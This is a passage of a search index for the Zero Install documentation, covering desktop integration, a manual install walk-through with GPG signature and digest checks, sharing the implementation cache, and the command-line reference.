app, add it to \"My applications\" by clicking on the star icon. Click the star icon again to put the app in the start menu or on the desktop. Zero Install Sync allows you to synchronize your application list and desktop integration between multiple computers. Advanced By clicking on Advanced settings , you can control exactly how Zero Install integrates an application: which shortcuts to create, which file types to associate, etc. You can perform desktop integration from the command-line as well. For example, to add VLC to your start menu and add register its supported file types: $ 0install integrate --add-standard http://repo.roscidus.com/utils/vlc See the command-line documentation for details. Machine-wide Zero Install's desktop integration is usually applied on a per-user basis. If you wish to \"install\" an application for all users on a machine you can switch to machine-wide mode. Start menu entries, desktop icons, file associations, etc. are then applied to their respective machine-wide locations. Even though the desktop integration is then shared by all users the actual solving and downloading of implementations is still done by individual users. This allows applications to be updated without administrative intervention and enables users to specify their own version overrides for applications. To prevent unnecessary duplication of application files use the Store Service to share an implementation cache between all users. Machine-wide mode can be used by adding the --machine option to one of the following commands: 0install add , 0install integrate , 0install remove , 0install sync You can also run 0install central --machine to use the normal GUI to manage machine-wide desktop integration.","title":"Desktop integration"},{"location":"basics/windows/#basics","text":"Open Zero Install and search for an app in the \"Catalog\" and click Run . If you like the app, add it to \"My applications\" by clicking on the star icon. Click the star icon again to put the app in the start menu or on the desktop. Zero Install Sync allows you to synchronize your application list and desktop integration between multiple computers.","title":"Basics"},{"location":"basics/windows/#advanced","text":"By clicking on Advanced settings , you can control exactly how Zero Install integrates an application: which shortcuts to create, which file types to associate, etc. You can perform desktop integration from the command-line as well. For example, to add VLC to your start menu and add register its supported file types: $ 0install integrate --add-standard http://repo.roscidus.com/utils/vlc See the command-line documentation for details.","title":"Advanced"},{"location":"basics/windows/#machine-wide","text":"Zero Install's desktop integration is usually applied on a per-user basis. If you wish to \"install\" an application for all users on a machine you can switch to machine-wide mode. Start menu entries, desktop icons, file associations, etc. are then applied to their respective machine-wide locations. Even though the desktop integration is then shared by all users the actual solving and downloading of implementations is still done by individual users. This allows applications to be updated without administrative intervention and enables users to specify their own version overrides for applications. To prevent unnecessary duplication of application files use the Store Service to share an implementation cache between all users. Machine-wide mode can be used by adding the --machine option to one of the following commands: 0install add , 0install integrate , 0install remove , 0install sync You can also run 0install central --machine to use the normal GUI to manage machine-wide desktop integration.","title":"Machine-wide"},{"location":"details/","text":"In this guide we install a program which is available through Zero Install, but without using the Zero Install software itself . Instead, we will perform each step manually, as an educational experience. Pick a program Pick a version Run it! Resolving dependencies Running with dependencies Review Tidying up Pick a program Choose a program to install from the list of feeds . A program with one dependency is ideal (the more it has, the longer it will take you to install it!). I'll be using Edit for this example. Open the feed for Edit above in your browser. The feed is an XML file listing the available versions of Edit. Your browser should render it as a web-page: Use View Source to see the XML. We'll use this information to download and run Edit. Security note: Why should we trust this XML document? Who made it? Could someone have tampered with it? Each Zero Install feed has a digital signature . You can find it at the end of the feed. It looks something like this: ... </interface> <!-- Base64 Signature iD8DBQBGBkYcrgeCgFmlPMERAuP4AJ45BlLx1w3ocxuLIFHzM4RfIAg4hgCfWRQ/0JOjU7tIjErm U3Vrz97gJk8= --> This is a GnuPG signature, but Base64 -encoded so that it can go in an XML document. To check it, we need to reverse the encoding, which is easily done with a little Python. Save the two lines of random-looking characters to a file ( encoded-signature ) and decode it: $ base64 --decode < encoded-signature > signature Now remove the whole signature block from the XML (every line from <!-- Base64 Signature onwards), save it as Edit.xml , and check it with GPG: $ gpg --keyid-format=long signature Detached signature. Please enter name of data file: Edit.xml gpg: Signature made Sun 25 Mar 2007 10:51:24 BST gpg: using DSA key AE07828059A53CC1 gpg: Good signature from \"Thomas Leonard ... If you don't have the feed author's key, you can get it from various places (in the normal way), or by fetching it from the same directory as the feed, e.g.: $ wget http://rox.sourceforge.net/2005/interfaces/AE07828059A53CC1.gpg $ gpg --import AE07828059A53CC1.gpg This all tells you that the XML file was created by the owner of the key and hasn't been tampered with. How you decide to trust the key itself is up to you, but one way is to check it using the default key information server: $ gpg --with-colons --fingerprint AE07828059A53CC1 | grep fpr fpr:::::::::92429807C9853C0744A68B9AAE07828059A53CC1: $ wget -qO - https://keylookup.appspot.com/key/92429807C9853C0744A68B9AAE07828059A53CC1 <?xml version=\"1.0\" encoding=\"utf-8\"?> <key-lookup> <item vote=\"good\">Thomas Leonard created Zero Install and ROX. This key is used to sign updates to the injector; you should accept it. </item> <item vote=\"good\">This key belongs to a Debian Maintainer.</item> </key-lookup> In any case, you should make a note of which key was used so you can ensure it's the same later, when you check for updates. Pick a version Edit's feed lists several versions. I'll pick the latest one: version 2.0. If you find that version to be buggy, you might make a note of that and try a different version. Some may have been released recently and be marked as \"testing\". Whether you skip such versions is up to you. The relevant section of the XML file is this bit: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> ... <implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"> <archive extract=\"edit-2.0\" href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/> </implementation> </group> This tells us that we can get Edit version 2.0 by downloading edit-2.0.tgz and extracting the edit-2.0 directory inside it: $ wget http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz $ tar xzf edit-2.0.tgz edit-2.0 $ ls edit-2.0 Edit Security note: How do we know the archive hasn't been tampered with? The author of the XML feed calculated a cryptographic digest of the archive's contents and stored it in the feed: <implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"> <archive extract=\"edit-2.0\" href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/> </implementation> We can calculate the value ourselves from the directory and compare (we already verified the signature on the feed, so we know that one's OK). Calculating the value is a little tricky; you have to create a manifest file listing all the files and directories in the archive, along with their digests too, by following these instructions . We'll cheat, by using 0store to generate it for us: $ 0store manifest edit-2.0 sha1 D 1127294333 /Edit F 0cfc0b0c42b4f4c077f005f31ea1801a8e43bde0 1053080001 3409 .DirIcon ... X d6f4507353737e35ce7af5ab10a589e5a644bec5 1106998691 1472 testreplace.py sha1=329e6c0191f65ef2996b49837d04c4cfe6934758 This says we have a directory called Edit containing a file called .DirIcon , and so on. The last line isn't part of the manifest; it's the digest of the manifest itself. It is this value that must match the id in the feed. It's useful to save the manifest output (minus the last line) in case we want to do an audit later: $ 0store manifest edit-2.0 sha1 | head -n -1 > edit-2.0/.manifest This file will have the digest we require: $ sha1sum edit-2.0/.manifest 329e6c0191f65ef2996b49837d04c4cfe6934758 edit-2.0/.manifest Run it! We've downloaded and unpacked Edit. How do we run it? We don't have to guess; the answer is in the XML feed file: <group main=\"Edit/AppRun\"> There was no main attribute on the implementation element, so we look in the containing group and find one. This tells us that we can run the program by executing the file Edit/AppRun inside the unpacked directory. $ ./edit-2.0/Edit/AppRun *** This program needs ROX-Lib2 (version 1.19.14) to run. If the program you picked didn't have any dependencies then it should now run (lucky you!). But, like many programs, Edit needs libraries to work. Resolving dependencies Our program needs some libraries before it will run. Which ones? Again, the feed XML tells us: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> We need a library called http://rox.sourceforge.net/2005/interfaces/ROX-Lib . You might already have one somewhere, or your distribution might carry it. If all else fails, we could try to guess where a suitable feed might be... http://rox.sourceforge.net/2005/interfaces/ROX-Lib seems like a good place to start... Go back to step 1! You need to download ROX-Lib's feed, check the signature, pick a version, download and unpack the archive, check the contents' digest, and check whether ROX-Lib in turn depends on other libraries (it doesn't). Running with dependencies OK, so you've got ROX-Lib too now. Things should look like this: $ ls edit-2.0 Edit.xml rox-lib2-2.0.3 ROX-Lib.xml How can we tell Edit where we put ROX-Lib? Again, the answer is in Edit's XML file: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> We need to add a directory inside our unpacked ROX-Lib to the $PYTHONPATH environment variable, and then try running Edit again: $ export PYTHONPATH=rox-lib2-2.0.3/ROX-Lib2/python $ ./edit-2.0/Edit/AppRun Finally Edit runs! Review So, what have we achieved? We've installed a program and its dependencies. We haven't touched anything outside of our test directory; no other programs on the system have been affected by this installation. We didn't need root access. We can undo the installation just by deleting our two XML files and the two unpacked archives. We didn't need to run any code from either Edit or ROX-Lib to perform the installation (we only ran them to test that it worked). If you have software for running programs in a restricted environment, you can install and run programs without even giving them write access to their own code. Finally, although it may have been a little tedious, everything we did could be automated. You could write a program to do all this for you (or use ours !). Tidying up Our home directory will become a big mess if we just install things in random directories. When we want to run another program that uses ROX-Lib, we'll want to be able to find the copy we already installed rather than downloading another copy. These files don't really need to be backed up. If we lost them, we could just download them again from the web. So, we'll put them in the ~/.cache directory which is designed for just this purpose. In fact, to avoid conflicts with other things using this directory, we'll keep everything under ~/.cache/0install.net , because it's all related to Zero Install. We have two XML files and two directories. What should we call them? It's not impossible to imagine there being two programs in the world both called Edit , so that's not a good name; we wouldn't know what to do if we wanted both on our system at once! A good choice is to use the full URL of Edit's feed for the XML file (replacing / characters with %2f in the traditional web way): $ mv Edit.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit It's a bit ugly, but at least it's unique and we can find it again. We'll store ROX-Lib's XML in the same way: $ mv ROX-Lib.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib What about the directories with the actual program files? We could use the same strategy, naming it from the URL where we got it, but this has some problems. For example, there might be lots of places where you can get the archive (mirrors, peer-to-peer, CD-ROM, etc). We don't care how we got it, all we care about is that it has the right digest. So, we'll name it after that! $ mv edit-2.0 ~/.cache/0install.net/implementations/sha1=329e6c0191f65ef2996b49837d04c4cfe6934758 $ mv rox-lib2-2.0.3 ~/.cache/0install.net/implementations/sha1=6a2e548a80368bd8c2b5b3abedccf9a0a6cb4333 This is exactly the scheme that 0launch uses. We can test this quite easily: $ 0launch --offline http://rox.sourceforge.net/2005/interfaces/Edit Zero Install runs Edit without downloading anything. It is able to use the files we downloaded and placed in its cache manually.","title":"Manual walk-through"},{"location":"details/#pick-a-program","text":"Choose a program to install from the list of feeds . A program with one dependency is ideal (the more it has, the longer it will take you to install it!). I'll be using Edit for this example. Open the feed for Edit above in your browser. The feed is an XML file listing the available versions of Edit. Your browser should render it as a web-page: Use View Source to see the XML. We'll use this information to download and run Edit. Security note: Why should we trust this XML document? Who made it? Could someone have tampered with it? Each Zero Install feed has a digital signature . You can find it at the end of the feed. It looks something like this: ... </interface> <!-- Base64 Signature iD8DBQBGBkYcrgeCgFmlPMERAuP4AJ45BlLx1w3ocxuLIFHzM4RfIAg4hgCfWRQ/0JOjU7tIjErm U3Vrz97gJk8= --> This is a GnuPG signature, but Base64 -encoded so that it can go in an XML document. To check it, we need to reverse the encoding, which is easily done with a little Python. Save the two lines of random-looking characters to a file ( encoded-signature ) and decode it: $ base64 --decode < encoded-signature > signature Now remove the whole signature block from the XML (every line from <!-- Base64 Signature onwards), save it as Edit.xml , and check it with GPG: $ gpg --keyid-format=long signature Detached signature. Please enter name of data file: Edit.xml gpg: Signature made Sun 25 Mar 2007 10:51:24 BST gpg: using DSA key AE07828059A53CC1 gpg: Good signature from \"Thomas Leonard ... If you don't have the feed author's key, you can get it from various places (in the normal way), or by fetching it from the same directory as the feed, e.g.: $ wget http://rox.sourceforge.net/2005/interfaces/AE07828059A53CC1.gpg $ gpg --import AE07828059A53CC1.gpg This all tells you that the XML file was created by the owner of the key and hasn't been tampered with. How you decide to trust the key itself is up to you, but one way is to check it using the default key information server: $ gpg --with-colons --fingerprint AE07828059A53CC1 | grep fpr fpr:::::::::92429807C9853C0744A68B9AAE07828059A53CC1: $ wget -qO - https://keylookup.appspot.com/key/92429807C9853C0744A68B9AAE07828059A53CC1 <?xml version=\"1.0\" encoding=\"utf-8\"?> <key-lookup> <item vote=\"good\">Thomas Leonard created Zero Install and ROX. This key is used to sign updates to the injector; you should accept it. </item> <item vote=\"good\">This key belongs to a Debian Maintainer.</item> </key-lookup> In any case, you should make a note of which key was used so you can ensure it's the same later, when you check for updates.","title":"Pick a program"},{"location":"details/#pick-a-version","text":"Edit's feed lists several versions. I'll pick the latest one: version 2.0. If you find that version to be buggy, you might make a note of that and try a different version. Some may have been released recently and be marked as \"testing\". Whether you skip such versions is up to you. The relevant section of the XML file is this bit: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> ... <implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"> <archive extract=\"edit-2.0\" href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/> </implementation> </group> This tells us that we can get Edit version 2.0 by downloading edit-2.0.tgz and extracting the edit-2.0 directory inside it: $ wget http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz $ tar xzf edit-2.0.tgz edit-2.0 $ ls edit-2.0 Edit Security note: How do we know the archive hasn't been tampered with? The author of the XML feed calculated a cryptographic digest of the archive's contents and stored it in the feed: <implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"> <archive extract=\"edit-2.0\" href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/> </implementation> We can calculate the value ourselves from the directory and compare (we already verified the signature on the feed, so we know that one's OK). Calculating the value is a little tricky; you have to create a manifest file listing all the files and directories in the archive, along with their digests too, by following these instructions . We'll cheat, by using 0store to generate it for us: $ 0store manifest edit-2.0 sha1 D 1127294333 /Edit F 0cfc0b0c42b4f4c077f005f31ea1801a8e43bde0 1053080001 3409 .DirIcon ... X d6f4507353737e35ce7af5ab10a589e5a644bec5 1106998691 1472 testreplace.py sha1=329e6c0191f65ef2996b49837d04c4cfe6934758 This says we have a directory called Edit containing a file called .DirIcon , and so on. The last line isn't part of the manifest; it's the digest of the manifest itself. It is this value that must match the id in the feed. It's useful to save the manifest output (minus the last line) in case we want to do an audit later: $ 0store manifest edit-2.0 sha1 | head -n -1 > edit-2.0/.manifest This file will have the digest we require: $ sha1sum edit-2.0/.manifest 329e6c0191f65ef2996b49837d04c4cfe6934758 edit-2.0/.manifest","title":"Pick a version"},{"location":"details/#run-it","text":"We've downloaded and unpacked Edit. How do we run it? We don't have to guess; the answer is in the XML feed file: <group main=\"Edit/AppRun\"> There was no main attribute on the implementation element, so we look in the containing group and find one. This tells us that we can run the program by executing the file Edit/AppRun inside the unpacked directory. $ ./edit-2.0/Edit/AppRun *** This program needs ROX-Lib2 (version 1.19.14) to run. If the program you picked didn't have any dependencies then it should now run (lucky you!). But, like many programs, Edit needs libraries to work.","title":"Run it!"},{"location":"details/#resolving-dependencies","text":"Our program needs some libraries before it will run. Which ones? Again, the feed XML tells us: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> We need a library called http://rox.sourceforge.net/2005/interfaces/ROX-Lib . You might already have one somewhere, or your distribution might carry it. If all else fails, we could try to guess where a suitable feed might be... http://rox.sourceforge.net/2005/interfaces/ROX-Lib seems like a good place to start... Go back to step 1! You need to download ROX-Lib's feed, check the signature, pick a version, download and unpack the archive, check the contents' digest, and check whether ROX-Lib in turn depends on other libraries (it doesn't).","title":"Resolving dependencies"},{"location":"details/#running-with-dependencies","text":"OK, so you've got ROX-Lib too now. Things should look like this: $ ls edit-2.0 Edit.xml rox-lib2-2.0.3 ROX-Lib.xml How can we tell Edit where we put ROX-Lib? Again, the answer is in Edit's XML file: <group main=\"Edit/AppRun\"> <requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"> <environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/> </requires> We need to add a directory inside our unpacked ROX-Lib to the $PYTHONPATH environment variable, and then try running Edit again: $ export PYTHONPATH=rox-lib2-2.0.3/ROX-Lib2/python $ ./edit-2.0/Edit/AppRun Finally Edit runs!","title":"Running with dependencies"},{"location":"details/#review","text":"So, what have we achieved? We've installed a program and its dependencies. We haven't touched anything outside of our test directory; no other programs on the system have been affected by this installation. We didn't need root access. We can undo the installation just by deleting our two XML files and the two unpacked archives. We didn't need to run any code from either Edit or ROX-Lib to perform the installation (we only ran them to test that it worked). If you have software for running programs in a restricted environment, you can install and run programs without even giving them write access to their own code. Finally, although it may have been a little tedious, everything we did could be automated. You could write a program to do all this for you (or use ours !).","title":"Review"},{"location":"details/#tidying-up","text":"Our home directory will become a big mess if we just install things in random directories. When we want to run another program that uses ROX-Lib, we'll want to be able to find the copy we already installed rather than downloading another copy. These files don't really need to be backed up. If we lost them, we could just download them again from the web. So, we'll put them in the ~/.cache directory which is designed for just this purpose. In fact, to avoid conflicts with other things using this directory, we'll keep everything under ~/.cache/0install.net , because it's all related to Zero Install. We have two XML files and two directories. What should we call them? It's not impossible to imagine there being two programs in the world both called Edit , so that's not a good name; we wouldn't know what to do if we wanted both on our system at once! A good choice is to use the full URL of Edit's feed for the XML file (replacing / characters with %2f in the traditional web way): $ mv Edit.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit It's a bit ugly, but at least it's unique and we can find it again. We'll store ROX-Lib's XML in the same way: $ mv ROX-Lib.xml \\ ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib What about the directories with the actual program files? We could use the same strategy, naming it from the URL where we got it, but this has some problems. For example, there might be lots of places where you can get the archive (mirrors, peer-to-peer, CD-ROM, etc). We don't care how we got it, all we care about is that it has the right digest. So, we'll name it after that! $ mv edit-2.0 ~/.cache/0install.net/implementations/sha1=329e6c0191f65ef2996b49837d04c4cfe6934758 $ mv rox-lib2-2.0.3 ~/.cache/0install.net/implementations/sha1=6a2e548a80368bd8c2b5b3abedccf9a0a6cb4333 This is exactly the scheme that 0launch uses. We can test this quite easily: $ 0launch --offline http://rox.sourceforge.net/2005/interfaces/Edit Zero Install runs Edit without downloading anything. It is able to use the files we downloaded and placed in its cache manually.","title":"Tidying up"},{"location":"details/cache/","text":"The Cache Everything 0install downloads from the net by default goes in ~/.cache/0install.net/ on Linux or %localappdata\\0install.net on Windows (see File locations ). Every application/library unpacks into a directory in that cache. So, there's one directory for ROX-Filer, and another for ClanBomber, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs. The idea is that you don't need to backup ~/.cache , because you can always download the stuff again. For example, if you delete the whole ~/.cache/0install.net/ directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it. Sharing Implementations Between users of the same system 0install can be configured to store its cache in /var/cache/0install.net/ on Linux or C:\\ProgramData\\0install.net on Windows. This allows sharing between users. The use of cryptographic digests makes this safe; users don't need to trust each other not to put malicious code in the shared cache. See: Enabling sharing between users Between virtual machines You can also share the cache between virtual machines: See: Enabling sharing between virtual machines Between machines using P2P Note: this is still experimental Using 0share you can locally distribute your implementations (versions of programs) via a peer-to-peer protocol. Removing Implementations If for some reason you would like to remove implementations from the cache (it does not make your system any 'cleaner', but it does free some disk space), you can do so using the Zero Install Cache dialog. On Linux, click on the Show Cache button in the Manage Programs box to get the cache explorer (or run 0install store manage ). Select the versions you don't need anymore and click on Delete . On Windows open the main GUI of Zero Install and click on Tools and Cache management (or run 0install store manage ). Select the versions you don't need anymore and click on Remove . Note: you can delete the entire cache, 0install will redownload whatever it needs later.","title":"Cache and sharing"},{"location":"details/cache/#the-cache","text":"Everything 0install downloads from the net by default goes in ~/.cache/0install.net/ on Linux or %localappdata\\0install.net on Windows (see File locations ). Every application/library unpacks into a directory in that cache. So, there's one directory for ROX-Filer, and another for ClanBomber, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs. The idea is that you don't need to backup ~/.cache , because you can always download the stuff again. For example, if you delete the whole ~/.cache/0install.net/ directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it.","title":"The Cache"},{"location":"details/cache/#sharing-implementations","text":"","title":"Sharing Implementations"},{"location":"details/cache/#between-users-of-the-same-system","text":"0install can be configured to store its cache in /var/cache/0install.net/ on Linux or C:\\ProgramData\\0install.net on Windows. This allows sharing between users. The use of cryptographic digests makes this safe; users don't need to trust each other not to put malicious code in the shared cache. See: Enabling sharing between users","title":"Between users of the same system"},{"location":"details/cache/#between-virtual-machines","text":"You can also share the cache between virtual machines: See: Enabling sharing between virtual machines","title":"Between virtual machines"},{"location":"details/cache/#between-machines-using-p2p","text":"Note: this is still experimental Using 0share you can locally distribute your implementations (versions of programs) via a peer-to-peer protocol.","title":"Between machines using P2P"},{"location":"details/cache/#removing-implementations","text":"If for some reason you would like to remove implementations from the cache (it does not make your system any 'cleaner', but it does free some disk space), you can do so using the Zero Install Cache dialog. On Linux, click on the Show Cache button in the Manage Programs box to get the cache explorer (or run 0install store manage ). Select the versions you don't need anymore and click on Delete . On Windows open the main GUI of Zero Install and click on Tools and Cache management (or run 0install store manage ). Select the versions you don't need anymore and click on Remove . Note: you can delete the entire cache, 0install will redownload whatever it needs later.","title":"Removing Implementations"},{"location":"details/cli/","text":"Zero Install command-lines begin with 0install . On Windows you can also use 0install-win instead. This will display outputs using windows instead of the console. Command Description select Selects a version of the program identified by URI, and compatible versions of all of its dependencies. Returns an exit status of zero if it selected a set of versions, and a status of 1 if it could not find a consistent set. download Behaves similarly to '0install select', except that it also downloads the selected versions if they are not already cached. Returns an exit status of 0 if it selected a suitable set of versions and they are now all downloaded and in the cache; returns a status of 1 otherwise. update Checks for updates to the program and download them if found. This is similar to '0install download --refresh', except that it prints information about whether any changes were found. run Behaves similarly to '0install download', except that it also runs the program after ensuring it is in the cache. Returns an exit status of 1 if the download step failed. Otherwise, the exit status will be the exit status of the program being run. import Imports a feed from a local file, as if it had been downloaded from the network. This is useful when testing a feed file, to avoid uploading it to a remote server in order to download it again. The file must have a trusted digital signature, as when fetching from the network. export (Windows only) Exports all feeds and implementations required to launch the program specified by a URI to a DIRECTORY. search Searches for feeds indexed by the mirror server that match specified keywords. Note that the default mirror server indexes all known feeds, regardless of quality; you must decide whether to trust the programs before running them. list Lists all locally known feed URIs. If a search term is given, only URIs containing that string are shown (case insensitive). catalog search (Windows only) Searches registered catalogs for applications that match the specified query. If no query is given all applications in the catalogs are listed. catalog refresh (Windows only) Refreshes (downloads) all registered catalogs. catalog add (Windows only) Adds an URI to the list of catalogs. catalog remove (Windows only) Removes an URI from the list of catalogs. catalog reset (Windows only) Resets the list of catalogs to the default source. catalog list (Windows only) Lists all registered catalogs. config View or change configuration settings. With no arguments, it displays all settings and their current values. With one argument, it displays the current value of the named setting. With two arguments, it sets the setting to the given value or resets it to the default value if the value \"default\" is given. add-feed Register an additional source of implementations (versions) of a program. remove-feed Un-registers a feed, reversing the effect of '0install add-feed'. list-feeds Lists all extra feeds added to URI using '0install add-feed'. digest Calculates the manifest digest of a directory or archive. store add Adds the contents of a directory or archive to the cache. store audit Checks that all implementations in the cache are undamaged. Additional arguments specify custom cache locations. store copy Copies an implementation into the cache. Similar to '0install store add', but the digest is extracted from the directory name. An additional arguments specifies a custom target cache location. store export (Windows only) Exports a cached implementation as an archive (ZIP, TAR, etc.). The result can be imported on another machine using '0install store add'. store find Determines the local path of a cached implementation. store list Lists all implementation cache directories. store list-implementations (Windows only) Lists all cached implementations. If a feed URI is specified only implementations for that particular feed are listed. store manage Displays a graphical user interface for managing implementations in the cache. Shows associations with cached feeds. store optimise Saves disk space by merging identical files with hardlinks. Additional arguments specify custom cache locations. store purge (Windows only) Removes all implementations from the cache. Use this command to clean up the system before removing Zero Install. Deleting cache directories manually may be difficult due to the NTFS ACLs employed to protect implementations against modification. Additional arguments specify custom cache locations. store remove Removes an implementation from the cache. store verify Makes sure an implementation has not been damaged (i.e. it manifest digest has not changed). store add-dir (Windows only) Adds a directory to the list of custom implementation caches. store remove-dir (Windows only) Removes a directory from the list of custom implementation caches. central (Windows only) Opens the central graphical user interface for launching and managing applications. add Add an application to the application list. remove (Windows only) Removes an application from the application list and undoes any desktop environment integration. remove-all (Windows only) Removes all applications from the application list and undoes any desktop environment integration. Use this command to clean up the system before removing Zero Install. destroy (Linux only) Removes an application. show (Linux only) Shows the current selections for an application whatchanged (Linux only) Shows the differences between the current and previous selections for an application. man (Linux only) Shows the man-page of a given command. integrate (Windows only) Adds an application to the application list (if missing) and integrate it into the desktop environment. alias (Windows only) Create an alias for launching an application via 0install without always having to enter the full URI. list-apps (Windows only) Lists all applications currently in your application list. If a search term is given, only application names containing that string are shown (case insensitive). update-all (Windows only) Updates all applications in the application list. repair-all (Windows only) Reapplies all desktop integrations of applications in the application list. sync (Windows only) Synchronizes the application list with the server. import-apps (Windows only) Imports a set of applications and desktop integrations from an existing app-list.xml file. maintenance deploy (Windows only) Deploys Zero Install to the specified TARGET directory or the default directory for programs and integrates it in the system. maintenance remove (Windows only) Removes the current instance of Zero Install from the system. self-update (Windows only) Updates Zero Install itself to the most recent version. select Selects a version of the program identified by URI, and compatible versions of all of its dependencies. Returns an exit status of zero if it selected a set of versions, and a status of 1 if it could not find a consistent set. Usage: 0install select [OPTIONS] URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. download Behaves similarly to '0install select', except that it also downloads the selected versions if they are not already cached. Returns an exit status of 0 if it selected a suitable set of versions and they are now all downloaded and in the cache; returns a status of 1 otherwise. Usage: 0install download [OPTIONS] URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in command-line mode. --batch (Windows only) Automatically answer questions with defaults when possible. Avoid unnecessary console output (e.g. progress bars). -v --verbose More verbose output. Use twice for even more verbose output. --customize (Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. -o --offline Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). -r --refresh Fetch fresh copies of all used feeds. --with-store DIR Add DIR to the list of implementation caches to search. However, new downloads will not be written to this directory. --command COMMAND Instead of executing the default command, use COMMAND instead. Possible command names are defined in the program's interface. Set to empty (\"\") to ignore the command during selection. --before VERSION Require a version of the main program earlier than VERSION . i.e., force the use of an old version the program. --not-before VERSION Require a version of the main program not earlier than VERSION . E.g., if you want to run version 2.0 or later, use --not-before=2.0. --version RANGE Require a version of the main program within the given RANGE . Ranges are separated by pipes (|). Each range is in the form \"START..!END\". The range matches versions where START <= VERSION < END. The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. --version-for URI RANGE For any library or sub-component with the given URI specifies the version RANGE (as for --version). -s --source Select source code rather than a binary. This is used internally by '0compile'. --os OS Forces the solver to target the operating system OS . Supported values: , POSIX, Linux, Solaris, FreeBSD, Darwin, MacOSX, Cygwin, Windows, unknown --cpu CPU Forces the solver to target a specific CPU . Supported values: , i386, i486, i586, i686, x86_64, ppc, ppc64, armv6l, armv7l, src, unknown --language Specifies the preferred language for the implementation. Use ISO short language codes (e.g. en or en-US). You can use this option multiple times to specify multiple acceptable languages. --xml Write selected versions to console as machine-readable XML. --show Show where the selected components are stored on the disk. update Checks for updates to the program and download them if found. This is similar to '0install download --refresh', except that it prints information about whether any changes were found. Usage: 0install update [OPTIONS] URI Option Description -? -h --help Show the built-in help text. --background (Windows only) Hide the graphical user interface and use something like a tray icon instead. Has no effect in 